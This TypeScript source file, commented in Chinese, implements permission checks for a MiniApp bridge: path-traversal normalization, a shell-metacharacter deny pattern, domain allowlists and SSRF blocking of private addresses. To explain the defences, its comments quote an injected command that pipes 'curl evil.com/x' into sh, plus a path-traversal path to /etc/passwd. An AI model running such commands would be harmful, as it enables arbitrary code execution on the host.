/**
 * MiniApp 能力授权的**纯判定**（对齐 OpenBitFun `miniapp-dev` 的
 * `resolve_policy` 语义）。
 *
 * 放在 `shared/` 而不是任一侧，因为两端都要用同一份判定：
 *   - renderer `appBridge.runAppCall`：快速失败，给作者即时反馈
 *   - sidecar `miniapp-app-dispatch`：真正的执行前闸门
 *
 * 两侧共用一份是**安全要求**而非 DRY 洁癖：renderer 是 WebView，它的判定
 * 可以被 XSS 或消息伪造绕过；sidecar 侧独立复算一遍，才构成纵深防御。若两份
 * 逻辑各自演进，必然出现"renderer 放行 / sidecar 判定不同"的偏差。
 *
 * 本文件不得 import 任何 renderer / server / cli 模块 —— `shared` 会被两边
 * 同时打进各自的 bundle（见 `.dependency-cruiser.cjs::shared-stays-pure`）。
 */

import { APP_ERROR_CODES, type AppErrorCode, type AppMethod } from './app-protocol';
import type { MiniAppPermissions } from './types';

export interface PermissionDecision {
  allowed: boolean;
  code?: AppErrorCode;
  reason?: string;
}

const ALLOW: PermissionDecision = { allowed: true };

function deny(
  reason: string,
  code: AppErrorCode = APP_ERROR_CODES.PERMISSION_DENIED,
): PermissionDecision {
  return { allowed: false, code, reason };
}

function asRecord(v: unknown): Record<string, unknown> {
  return v && typeof v === 'object' && !Array.isArray(v) ? (v as Record<string, unknown>) : {};
}


/**
 * 归一化路径：统一分隔符、去掉尾部斜杠、**折叠 `.` / `..` 段**。
 *
 * 折叠 `..` 不是洁癖而是安全要求：`/data/app/../../etc/passwd` 在字符串上以
 * `/data/app/` 开头，裸 `startsWith` 会把它当成"在 /data/app 之内"而放行，
 * 而 Node 的 fs 会照 `..` 真实解析到 `/etc/passwd`。前缀比较必须在**解析后**
 * 的路径上做，所以这里先做词法折叠。
 *
 * 词法折叠不等于 `realpath`：symlink 仍需执行侧解析（sidecar 侧对
 * `{appdata}` / `{workspace}` 根目录做 canonicalize 复核）。这一层挡住的是
 * 纯字符串构造的穿越，成本极低且覆盖绝大多数越权尝试。
 */
function normalizePath(p: string): string {
  const unified = p.replace(/\\/g, '/');
  // 保留盘符 / UNC 前缀的起始斜杠语义：'C:/x' 与 '/x' 都以 '/' 段开头
  const segments = unified.split('/');
  const out: string[] = [];
  for (const seg of segments) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') {
      // 已到根还遇到 '..' —— 保持它，让结果以 '..' 开头从而匹配不到任何绝对前缀
      if (out.length === 0) out.push('..');
      else out.pop();
      continue;
    }
    out.push(seg);
  }
  const joined = out.join('/');
  // 绝对路径还原前导 '/'（'C:' 已含在第一个 segment 里）
  if (unified.startsWith('/') && !joined.startsWith('/')) return `/${joined}`;
  return joined;
}

/**
 * 路径是否落在任一允许前缀内。
 *
 * 用分隔符边界检查而非裸 `startsWith`：否则声明 `{appdata}/src` 会意外放行
 * `{appdata}/src-secrets`（classic prefix confusion）。调用方**必须**先把
 * `{appdata}` 之类的模板展开成绝对路径，本函数不认模板。
 *
 * ## 尾部双星号 glob
 *
 * `meta.json` 里作者写的是 `{workspace}/**`（"整个工作区"），这是最常见的
 * 声明形态。若把它当字面量前缀比较，`{workspace}/**` 永远匹配不到任何真实路径
 * —— MiniApp 会得到一条莫名其妙的 "path not covered by permissions.fs.read"，
 * 而它自己声明得完全正确。
 *
 * 因此支持**仅限尾部**的双星号（正斜杠与反斜杠两种写法都归一化后匹配），语义
 * 是"该前缀下的所有内容，含子目录"。只支持尾部是有意的：中间段的通配需要
 * 真正的 glob 匹配器，而那会让 `meta.json` 变成一个难以审计的能力声明 ——
 * 前缀声明的价值恰恰在于"看一眼就知道能碰哪些目录"。
 */
export function isPathAllowed(path: string, allowedPrefixes: readonly string[]): boolean {
  const target = normalizePath(path);
  if (!target) return false;
  return allowedPrefixes.some((rawPrefix) => {
    const recursive = /\*\*$/.test(rawPrefix.trim());
    // 去掉 glob 段再归一化，否则 '**' 会被当成一个真实目录名参与比较
    const p = normalizePath(recursive ? rawPrefix.trim().replace(/\*\*$/, '') : rawPrefix);
    if (!p) return false;
    // 声明 `{appdata}/**` 时，appdata 自身（不带尾斜杠）也应当放行：
    // 作者写 '**' 的意图是"这个目录下的一切"，不包含目录本身是个反直觉陷阱。
    const boundary = p.endsWith('/') ? p : `${p}/`;
    return target === p || target.startsWith(boundary);
  });
}

/**
 * shell 命令名白名单：取首个空白分隔 token。
 *
 * ## 为什么要同时拒掉 shell 元字符
 *
 * 白名单的语义是"这个 MiniApp 允许启动 `git`"。但执行侧把**整条字符串**交给
 * `promisify(exec)`，也就是 `cmd.exe /d /s /c <整条>`（POSIX 下 `/bin/sh -c`）。
 * 于是 `git status && curl evil.com/x | sh` 的首个 token 确实是 `git`、白名单
 * 放行，随后 `&&` / `&` / `|` / `^` / `%VAR%` 全部照常执行 —— 声明一条无害
 * 命令就换来了完整任意命令执行。Windows 上尤其直接：`&` 和 `>` 就能落地文件。
 *
 * 早先这里写着"真正防住 `git ... && evil` 这类组合的是执行侧"，而执行侧并不存在
 * 这样的防护；这行注释本身就是这个洞的说明书。
 *
 * 修法是**连元字符一起拒**，而不是去实现完整 shell 解析（那等于内嵌一个 shell
 * 解释器，且每个平台的转义规则都不相同）。代价是 MiniApp 不能用管道 / 重定向 /
 * 逻辑连接；要这些能力应当是宿主显式提供的能力，而不是从 `shell.allow` 里漏出去。
 *
 * 引号内的元字符同样拒：不做引号解析就无法区分"引号里的 `&`"和"引号外的 `&`"
 * ——而 `cmd.exe` 自己在若干位置上的引号规则与 POSIX 不同，猜错就是漏。
 * 落败方向是 fail-closed：宁可少放行一条合法命令，不放行一条组合命令。
 *
 * 字符集只收**能改变执行**的那些（串联、替换、重定向、变量展开、转义、引号），
 * 刻意不收 `~ * ? , [ ] { }`：它们是 glob / 花括号展开，只会改参数不会改命令，
 * 收进来只会误伤 `git diff HEAD~20 HEAD` 这类内置应用真实在发的命令。
 */
const SHELL_METACHARACTERS = /[;&|<>^`%!()$"'\r\n]/;

export function commandAllowed(command: string, allowList: readonly string[]): boolean {
  if (SHELL_METACHARACTERS.test(command)) return false;
  const first = (command.trim().split(/\s+/)[0] ?? '').toLowerCase();
  if (!first) return false;
  return allowList.some((allowed) => {
    const a = allowed.trim().toLowerCase();
    return a === first || a === `${first}.exe` || `${a}.exe` === first;
  });
}

/** 域名白名单：精确匹配或子域后缀匹配。 */
export function hostAllowed(url: string, allowList: readonly string[]): boolean {
  let host: string;
  try {
    host = new URL(url).host.toLowerCase();
  } catch {
    return false;
  }
  return allowList.some((allowed) => {
    const a = allowed.trim().toLowerCase().replace(/^\*\./, '');
    if (!a) return false;
    return host === a || host.endsWith(`.${a}`);
  });
}

/**
 * 私网 / 环回 / link-local 目标判定（SSRF 红线）。
 *
 * 云 metadata（`169.254.169.254`）与 loopback 都能把宿主变成内网跳板。白名单
 * 是域名级控制，这里是解析结果级控制 —— 攻击者可用自己的白名单域名指向
 * `127.0.0.1`，只有这层拦得住。
 *
 * ## 为什么 IPv6 要真的解析，不能拿正则比字面量
 *
 * 同一台机器有无穷多种写法。正则版漏掉的每一种都是一条 SSRF 通道，而且漏得
 * 很安静：`[::ffff:7f00:1]`（= 127.0.0.1）与 `[::ffff:a9fe:a9fe]`
 * （= 169.254.169.254）都匹配不上任何一条 IPv4 正则，于是云 metadata 那条红线
 * 形同虚设；连**完全展开**的 `[0:0:0:0:0:0:0:1]` 也匹配不上 `::1`。
 * 逐个补字面量是打地鼠 —— 下一个变体还会漏。
 *
 * 所以这里把 IPv6 解析成 8 个 16-bit 组再判定。顺带把 `::ffff:0:0/96`
 * （IPv4-mapped）与 `::/96`（deprecated 的 IPv4-compatible）解出内嵌的
 * IPv4 交给同一套 IPv4 规则 —— 它们本来就是 IPv4，只是写成了 IPv6。
 *
 * 已知的**剩余**缺口：这层判的是 URL 里的字面量，从不解析 DNS，所以
 * "自己的白名单域名解析到 127.0.0.1"这一类仍需在出口处做解析后校验才能根治。
 * 那需要 connect 阶段的地址钉扎，是比本函数大一号的改动，别在这里假装修好了。
 */
export function isPrivateHostname(hostname: string): boolean {
  const h = hostname.toLowerCase().replace(/^\[|\]$/g, '');
  if (h === 'localhost' || h.endsWith('.localhost')) return true;
  if (h === '0.0.0.0') return true;
  if (h.includes(':')) {
    const v6 = parseIpv6(h);
    // 长得像 IPv6 但解析不出来 = 不是我们认识的地址。fail-closed：宁可拒。
    if (!v6) return true;
    // ::ffff:a.b.c.d 与 ::a.b.c.d —— 就是 IPv4，只是写成了 IPv6
    const v4mapped = v6.slice(0, 5).every((g) => g === 0) && v6[5] === 0xffff;
    const v4compat = v6.slice(0, 6).every((g) => g === 0) && v6[6] !== 0;
    if (v4mapped || v4compat) return isPrivateIpv4(groupsToIpv4(v6[6], v6[7]));
    if (v6.every((g) => g === 0)) return true; // ::
    if (v6.slice(0, 7).every((g) => g === 0) && v6[7] === 1) return true; // ::1
    if ((v6[0] & 0xfe00) === 0xfc00) return true; // fc00::/7 ULA
    if ((v6[0] & 0xffc0) === 0xfe80) return true; // fe80::/10 链路本地
    return false;
  }
  return isPrivateIpv4(h);
}

function isPrivateIpv4(h: string): boolean {
  if (/^127\./.test(h) || /^10\./.test(h) || /^192\.168\./.test(h)) return true;
  if (/^169\.254\./.test(h)) return true;
  const m = /^172\.(\d{1,3})\./.exec(h);
  return !!m && Number(m[1]) >= 16 && Number(m[1]) <= 31;
}

function groupsToIpv4(hi: number, lo: number): string {
  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;
}

/**
 * IPv6 文本 → 8 个 16-bit 组；解析不出来返回 null。
 * 支持 `::` 压缩与结尾的内嵌 IPv4 四段式（`::ffff:127.0.0.1`）。
 */
function parseIpv6(h: string): number[] | null {
  const halves = h.split('::');
  if (halves.length > 2) return null;
  const toGroups = (part: string): number[] | null => {
    if (!part) return [];
    const out: number[] = [];
    for (const seg of part.split(':')) {
      if (seg.includes('.')) {
        const v4 = seg.split('.');
        if (v4.length !== 4) return null;
        const n = v4.map((x) => (/^\d{1,3}$/.test(x) ? Number(x) : NaN));
        if (n.some((x) => !Number.isInteger(x) || x > 255)) return null;
        out.push((n[0] << 8) | n[1], (n[2] << 8) | n[3]);
        continue;
      }
      if (!/^[0-9a-f]{1,4}$/.test(seg)) return null;
      out.push(parseInt(seg, 16));
    }
    return out;
  };
  const left = toGroups(halves[0]);
  if (!left) return null;
  if (halves.length === 1) return left.length === 8 ? left : null;
  const right = toGroups(halves[1]);
  if (!right) return null;
  const fill = 8 - left.length - right.length;
  if (fill < 1) return null;
  return [...left, ...new Array<number>(fill).fill(0), ...right];
}

// rmdir / unlink 是单路径的删除动作，归入写侧：能写才能删
const READ_METHODS = new Set(['readFile', 'readdir', 'stat', 'lstat', 'access']);
const WRITE_METHODS = new Set([
  'writeFile',
  'appendFile',
  'mkdir',
  'rm',
  'rmdir',
  'unlink',
  'copyFile',
  'rename',
]);

/**
 * 权限判定。`method` 为点分名（`'fs.readFile'`）。
 *
 * 未知方法不在这里判 —— `verifyAppCall` 已经把它过滤掉了；本函数只关心
 * "已知方法是否被 meta.json 授权"。
 *
 * 权限模型是**白名单**：没声明 = 全禁。`storage` / `os` / `dialog` /
 * `clipboard` 无需声明（storage 固定落在 appdata 内的 `storage.json`，
 * dialog 是用户显式操作，os 只读）。
 */
export function checkAppPermission(
  method: AppMethod,
  params: unknown,
  perms: MiniAppPermissions,
): PermissionDecision {
  const [group, name] = method.split('.');
  switch (group) {
    case 'fs':
      return checkFs(name ?? '', params, perms);
    case 'shell':
      return checkShell(params, perms);
    case 'net':
      return checkNet(params, perms);
    case 'call':
      return perms.node?.enabled === true
        ? ALLOW
        : deny('app.call requires meta.permissions.node.enabled = true');
    case 'ai':
      return checkAi(params, perms);
    case 'agent':
      return checkAgent(params, perms);
    case 'storage':
    case 'os':
    case 'dialog':
    case 'clipboard':
      return ALLOW;
    default:
      return deny(`Unknown method '${method}'`, APP_ERROR_CODES.UNKNOWN_METHOD);
  }
}

function checkFs(name: string, params: unknown, perms: MiniAppPermissions): PermissionDecision {
  const p = asRecord(params);
  // copyFile / rename 有两个路径，读侧与写侧都要过
  const paths = [p.path, p.from, p.to].filter((x): x is string => typeof x === 'string');
  if (paths.length === 0) return deny('fs call requires a path', APP_ERROR_CODES.INVALID_PARAMS);

  if (READ_METHODS.has(name)) {
    const allow = perms.fs?.read ?? [];
    if (allow.length === 0) return deny('no fs.read declared in meta.permissions');
    return paths.every((x) => isPathAllowed(x, allow))
      ? ALLOW
      : deny(`fs.${name} path not covered by permissions.fs.read`);
  }
  if (WRITE_METHODS.has(name)) {
    const allow = perms.fs?.write ?? [];
    if (allow.length === 0) return deny('no fs.write declared in meta.permissions');
    return paths.every((x) => isPathAllowed(x, allow))
      ? ALLOW
      : deny(`fs.${name} path not covered by permissions.fs.write`);
  }
  return deny(`Unknown fs method '${name}'`, APP_ERROR_CODES.UNKNOWN_METHOD);
}

/**
 * `app.ai.*`：必须显式 `ai.enabled`。`allowed_models` 声明后即成硬上限 ——
 * MiniApp 传了未声明的 model 直接拒，不做"降级到默认模型"这种静默替换
 * （作者会以为自己在用 A 模型，实际拿到 B 的输出，排查成本极高）。
 */
function checkAi(params: unknown, perms: MiniAppPermissions): PermissionDecision {
  if (perms.ai?.enabled !== true) {
    return deny('app.ai requires meta.permissions.ai.enabled = true');
  }
  const model = asRecord(params).model;
  if (model !== undefined && typeof model !== 'string') {
    return deny('app.ai model must be a string', APP_ERROR_CODES.INVALID_PARAMS);
  }
  const allowed = perms.ai.allowed_models;
  // 未声明 = 不限制模型；声明了 = 逐个精确匹配（支持 '*' 通配全部）
  if (model && allowed && allowed.length > 0) {
    const ok = allowed.some((m) => m === '*' || m.trim() === model);
    if (!ok) return deny(`model not in permissions.ai.allowed_models: ${model}`);
  }
  return ALLOW;
}

/**
 * `app.agent.*`：必须显式 `agent.enabled`。与 `ai` 分开判定 —— 见
 * `types.ts::MiniAppPermissions.agent` 的理由（agent 会派生真实 Session，
 * 逃逸面高一档，不能被 `ai.enabled` 顺带打开）。
 */
function checkAgent(_params: unknown, perms: MiniAppPermissions): PermissionDecision {
  if (perms.agent?.enabled !== true) {
    return deny('app.agent requires meta.permissions.agent.enabled = true');
  }
  return ALLOW;
}

function checkShell(params: unknown, perms: MiniAppPermissions): PermissionDecision {
  const cmd = asRecord(params).command;
  if (typeof cmd !== 'string' || !cmd.trim()) {
    return deny('shell.exec requires a command', APP_ERROR_CODES.INVALID_PARAMS);
  }
  const allow = perms.shell?.allow ?? [];
  if (allow.length === 0) return deny('no shell.allow declared in meta.permissions');
  return commandAllowed(cmd, allow)
    ? ALLOW
    : deny(`command not in permissions.shell.allow: ${cmd.trim().split(/\s+/)[0]}`);
}

function checkNet(params: unknown, perms: MiniAppPermissions): PermissionDecision {
  const url = asRecord(params).url;
  if (typeof url !== 'string' || !url) {
    return deny('net.fetch requires a url', APP_ERROR_CODES.INVALID_PARAMS);
  }
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return deny('net.fetch url is not a valid URL', APP_ERROR_CODES.INVALID_PARAMS);
  }
  if (parsed.protocol !== 'https:') {
    return deny('net.fetch only allows https', APP_ERROR_CODES.INVALID_PARAMS);
  }
  const allow = perms.net?.allow ?? [];
  if (allow.length === 0) return deny('no net.allow declared in meta.permissions');
  return hostAllowed(url, allow)
    ? ALLOW
    : deny(`host not in permissions.net.allow: ${parsed.host}`);
}

/**
 * renderer 侧**能不能独立判定**这个方法。
 *
 * `fs.*` 是唯一答案为「不能」的一族：`meta.json` 的 schema 强制每条 fs 路径
 * 以 `{appdata}` / `{workspace}` / `{user-selected}` 开头（见
 * `meta-schema.ts` → `validatePathTemplatePrefix`），而展开成绝对前缀需要
 * sidecar 的 `currentAgentDir` —— 那是 sidecar 进程的可变状态，renderer 拿不到。
 *
 * 所以 renderer 拿未展开的模板去前缀比较，结果是**恒不匹配**：作者调用
 * `app.fs.readFile(app.appDataDir + '/x.json')` 在 renderer 这道闸就被拒，
 * 压根到不了真正会正确展开的 sidecar。实测三个 bundled MiniApp 的
 * `fs.read/write` 声明全部落在这个洞里 —— 能力等于不存在。
 *
 * 因此 fs 的唯一权威是 sidecar（它独立复算、还额外做 canonicalize 复核）。
 * renderer 跳过预判**不削弱**纵深防御：预判本来就不是安全边界（WebView 可被
 * 伪造），真正的边界是 sidecar 那一遍。
 */
export function rendererCanDecide(method: AppMethod): boolean {
  return !method.startsWith('fs.');
}

/** `runAppCall` 的返回信封，直接喂给 `buildAppResult`。 */
export type AppCallOutcome =
  | { ok: true; result: unknown }
  | { ok: false; error: { code: string; message: string } };

/**
 * 「权限 → 执行 → 统一错误信封」的骨架。
 *
 * `dispatch` 由调用方注入（renderer 走 HTTP，测试注入假实现），因此本函数
 * 不碰任何进程特定 API，可以被两端复用。永不抛异常 —— 失败一律转成信封，
 * 否则 iframe 侧的 Promise 会永远 pending。
 *
 * ## `dispatch` 返回的是**信封**，不是业务结果
 *
 * 这个类型不是 `{ok:true,result} | {ok:false,error}` 的同义反复，而是承重结构。
 * 它曾经被写成 `Promise<unknown>`，于是本函数把返回值无条件包成
 * `{ok:true, result: ...}` —— 而真实的 `createAppDispatcher` 从不 throw，
 * 它把 sidecar 的失败**作为返回值**交回来。结果每一次宿主失败都被套成成功：
 *
 *   {ok:true, result:{ok:false, error:{code:'PERMISSION_DENIED'}}}
 *
 * runtime 的 `if (d.ok) resolve(...) else reject(...)` 于是走了 resolve 分支，
 * 作者的 `try/catch` 永不触发，`const text = await app.fs.readFile(p)` 拿到的是
 * 一个错误信封对象而不是文件内容。全部 30 个方法一致地静默失败。
 *
 * 写成 `Promise<unknown>` 就是这个 bug 的根因：类型抹掉了"返回值是信封"这件
 * 事，函数体自然也无从区分业务结果与失败信封。恢复这个类型即恢复语义。
 */
export async function runAppCall(
  method: AppMethod,
  params: unknown,
  perms: MiniAppPermissions,
  dispatch: (method: AppMethod, params: unknown) => Promise<AppCallOutcome>,
): Promise<AppCallOutcome> {
  const decision = rendererCanDecide(method)
    ? checkAppPermission(method, params, perms)
    : { allowed: true };
  if (!decision.allowed) {
    return {
      ok: false,
      error: {
        code: decision.code ?? APP_ERROR_CODES.PERMISSION_DENIED,
        message: decision.reason ?? 'denied',
      },
    };
  }
  try {
    // 透传而不是重新包装：dispatcher 已经把失败表达成 ok:false 信封了。
    return await dispatch(method, params);
  } catch (e) {
    return {
      ok: false,
      error: {
        code: APP_ERROR_CODES.HOST_ERROR,
        message: e instanceof Error ? e.message : String(e),
      },
    };
  }
}
